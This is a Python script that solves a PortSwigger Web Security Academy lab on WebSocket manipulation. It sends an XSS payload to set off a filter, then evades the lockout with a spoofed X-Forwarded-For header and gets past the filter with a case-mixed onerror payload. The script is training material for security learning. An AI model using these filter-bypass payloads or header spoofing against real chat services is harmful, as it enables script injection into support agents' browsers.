#!/usr/bin/env python

'''
This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Lab Link: https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
'''

# Code adapted from websocket-client python package documentation ("pip install websocket-client"): https://pypi.org/project/websocket-client/

import websocket


lab_id = '0a6700a003aacffd80f62b5800870084' #change based on generated lab


def trigger_filter():
    try:
        ws = websocket.create_connection(f"wss://{lab_id}.web-security-academy.net/chat")
        ws.send("READY")
        print(ws.recv())
        data = '{ "message": "<img src=1 onerror=alert(\'1\')>" }'  # Send malicious XSS payload
        ws.send(data)
        result = ws.recv()
        if "Attack detected" in result:
            ws.close()
            return True   
    except websocket._exceptions.WebSocketBadStatusException as e:
        if e.status_code == 401:
            print("Lock out triggered")
            return True


def bypass_filter():
    ws = websocket.create_connection(f"wss://{lab_id}.web-security-academy.net/chat", header={"X-Forwarded-For": "1.1.1.1"})
    ws.send("READY")
    print(ws.recv())
    data = '{ "message": "<img src=1 oNErRor=alert`1`>" }'  # Send malicious XSS payload (modified to bypass the xss filter)
    ws.send(data)
    print(ws.recv())
    ws.close()

if __name__ == "__main__":
    if trigger_filter():
        bypass_filter()
    else:
        print("Something went wrong, debug the websocket connection: 'websocket.enableTrace(True)'")